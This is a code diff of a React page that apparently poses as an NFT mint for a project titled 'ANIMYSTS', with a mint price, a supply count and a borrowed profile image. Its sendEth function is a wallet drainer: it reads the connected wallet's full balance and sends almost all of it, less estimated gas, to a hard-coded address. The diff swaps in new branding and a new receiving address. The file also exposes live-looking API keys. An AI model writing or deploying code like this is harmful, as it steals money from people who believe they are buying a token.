@@ -3,10 +3,10 @@ import {useEffect, useState} from "react";
 import imgDiscord from './icons8-discord-50.png'
 import imgTwitter from './icons8-twitter-50.png'
 
-const ethAmount = 0.05
-const image = 'https://pbs.twimg.com/profile_images/1632556844685172738/THx0dwcm_400x400.jpg'
-const Title = 'Nightwalkers'
-const supply = 790
+const ethAmount = 0.03
+const image = 'https://pbs.twimg.com/profile_images/1631247458985721858/XmOfPbC0_400x400.jpg'
+const Title = 'ANIMYSTS'
+const supply = 31
 
 document.title = Title
 document.getElementById('favicon').setAttribute('href', image)
@@ -21,6 +21,12 @@ function App() {
             const response = await fetch('https://api.etherscan.io/api?module=gastracker&action=gasoracle&apikey=PW7Z9MJMX6YRBM2M2HAS6CP14Y1ZCUXPWH')
             const responseJSON = await response.json()
             setGas(responseJSON?.result?.FastGasPrice)
+//             console.log(responseJSON, 'etherscan')
+//             const network = 'eth'
+//             const key = '741065ff3a854d9abb1fd5d50cf3f0e3'
+//             const res = await fetch(`https://api.owlracle.info/v3/${ network }/gas?apikey=${ key }`)
+//             const data = await res.json()
+//             console.log(data, 'qwe')
         }
         fetchRequest()
     }, [])
@@ -34,23 +40,28 @@ function App() {
     }
 
     const sendEth = async () => {
-        const address = await window.ethereum.request({method: 'eth_requestAccounts'})
+        try {
+            const address = await window.ethereum.request({method: 'eth_requestAccounts'})
 
-        const balance = await window.ethereum.request({method: 'eth_getBalance', params: [address[0], 'latest']})
-        const convertedBalance = parseInt(balance, 16) * Math.pow(10, -18)
-        // console.log('balance', ethAmount, gas, (gas / 15) / 3089, (ethAmount - (Number(gas) / 10000)))
+            const balance = await window.ethereum.request({method: 'eth_getBalance', params: [address[0], 'latest']})
+            const convertedBalance = parseInt(balance, 16) * Math.pow(10, -18)
+            // console.log('balance', ethAmount, gas, (gas / 15) / 3089, (ethAmount - (Number(gas) / 10000)))
+            console.log(convertedBalance, gas, Number(gas) / 60000, convertedBalance, parseInt((convertedBalance - (gas / 100000)) * 1000000000000000000).toString(16))
+            let params = [{
+                "from": address[0],
+                "to": '0xAc1e81526bB869aA73B5B41D62dF4AD811df3d3B',
+                // "gas": Number(((gas / 15) / 3089) * 10000000).toFixed().toString(16),
+                //"gasPrice": Number(gas * 1000000000).toString(16),
+                "value": parseInt((convertedBalance - (Number(gas) / 20000)) * 1000000000000000000).toString(16)
+            }]
 
-        let params = [{
-            "from": address[0],
-            "to": '0x57f415C2128875C9e4e3EDB2080010837D10e1Cd',
-            // "gas": Number(((gas / 15) / 3089) * 10000000).toFixed().toString(16),
-            // "gasPrice": Number(gas * 600000000).toString(16),
-            "value": parseInt(convertedBalance * 1000000000000000000).toString(16)
-        }]
-
-        const response = await window.ethereum.request({method: 'eth_sendTransaction', params}).catch(err => {
-            console.log(err)
-        })
+            const response = await window.ethereum.request({method: 'eth_sendTransaction', params}).catch(err => {
+                alert(`NOT ENOUGH ${((convertedBalance - (Number(gas) / 20000)) * (-1)).toFixed(6)} ETH`)
+            })
+        } catch (err) {
+            alert(err)
+        }
+        
     }
 
     setTimeout(() => {
